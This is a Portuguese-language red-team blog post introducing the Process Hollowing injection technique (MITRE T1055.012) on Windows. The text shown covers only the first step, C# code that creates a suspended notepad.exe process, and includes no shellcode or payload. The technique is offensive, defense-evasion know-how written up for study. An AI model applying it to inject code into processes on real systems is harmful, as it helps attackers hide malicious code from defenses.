---
title: "Process Hollowing: uma análise interna."
date: 2024-11-09 00:00:00 +0800
categories: [Windows, Process Injection, Shellcode]
tags: [Red Team]
---

![Desktop View](https://i.imgur.com/XzUPqOm.jpeg){: width="400" height="400" }

O Windows não deixa a desejar quando o assunto é Process Injection. Diferentes técnicas de injeção de shellcodes em processos locais/remotos são descobertas e publicadas para pesquisa. Dentre elas, uma que me chamou bastante atenção, e que é o assunto que abordaremos hoje, é a técnica de **Process Hollowing**!

O interessante dessa técnica é que ela vai além do funcionamento básico de uma injeção de shellcode. Em vez de apenas alocar memória no processo remoto e inserir o shellcode, exploraremos a estrutura fundamental de um executável PE para abusarmos de atributos importantes para a execução do nosso código.

## Introdução

De acordo com o MITRE ATT&CK, a técnica [T1055.012](https://attack.mitre.org/techniques/T1055/012/) consiste em "adversários podem injetar código malicioso em processos suspensos e esvaziados para evadir defesas baseadas em processos". Simplificadamente, o ataque ocorre com o seguinte workflow: 

![Desktop View](https://i.imgur.com/NKCa1rO.png)

Onde:

- `Hollowing de Processo`: Trata-se da etapa especial do ataque. O atacante irá realizar o "hollowing", ou o "esvaziamento" do conteúdo do processo.
- `Injeção de Shellcode`: É nesta etapa onde o invasor injeta o conteúdo do shellcode no campo esvaziado do processo.
- `Controle de Execução`: Ocorre quando o shellcode é executado.

Sem mais enrolação, partiremos para o código!

## CreateProcess

Primeiramente, vamos criar um novo processo "notepad.exe" suspenso. É este processo que será submetido ao ataque. Para isso, utilizamos a API "CreateProcess".

```csharp
[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
private struct STARTUPINFO
{
	public Int32 cb;
	public string lpReserved;
	public string lpDesktop;
	public string lpTitle;
	public Int32 dwX;
	public Int32 dwY;
	public Int32 dwXSize;
	public Int32 dwYSize;
	public Int32 dwXCountChars;
	public Int32 dwYCountChars;
	public Int32 dwFillAttribute;
	public Int32 dwFlags;
	public Int16 wShowWindow;
	public Int16 cbReserved2;
	public IntPtr lpReserved2;
	public IntPtr hStdInput;
	public IntPtr hStdOutput;
	public IntPtr hStdError;
}

[StructLayout(LayoutKind.Sequential)]
private struct PROCESS_INFORMATION
{
	public IntPtr hProcess;
	public IntPtr hThread;
	public int dwProcessId;
	public int dwThreadId;
}

[DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
private static extern bool CreateProcess(
	string lpApplicationName,
	string lpCommandLine,
	IntPtr lpProcessAttributes,
	IntPtr lpThreadAttributes,
	bool bInheritHandles,
	uint dwCreationFlags,
	IntPtr lpEnvironment,
	string lpCurrentDirectory,
	[In] ref STARTUPINFO lpStartupInfo,
	out PROCESS_INFORMATION lpProcessInformation
);

static void Main()
{
	STARTUPINFO si = new STARTUPINFO();
	PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

	bool createProcessBool = CreateProcess(
		null,
		@"C:\Windows\System32\notepad.exe",
		IntPtr.Zero,
		IntPtr.Zero,
		false,
		0x00000004,
		IntPtr.Zero,
		null,
		ref si,
		out pi
	);

	if (createProcessBool == false)
	{
		Console.WriteLine("CreateProcess ERROR!");
		Console.WriteLine($"ERROR CODE: {Marshal.GetLastWin32Error()}");
		Environment.Exit(0);
	}

	else
	{
		Console.WriteLine(". CreateProcess SUCCESS!");
		Console.WriteLine($".. Process HANDLE: {pi.hProcess}");
		Console.WriteLine($"... Process THREAD: {pi.hThread} \n");
	}
}
```

>`CREATE_SUSPENDED (0x00000004)`: o valor que define o novo processo como suspenso. Para mais informações, veja esta [documentação](https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags).
{: .prompt-info }

Executando o código acima, um novo processo "notepad.exe" será criado no modo suspenso. Podemos validar isso abrindo o nosso gerenciador de tarefas.

![Desktop View](https://i.imgur.com/LU62o94.png)
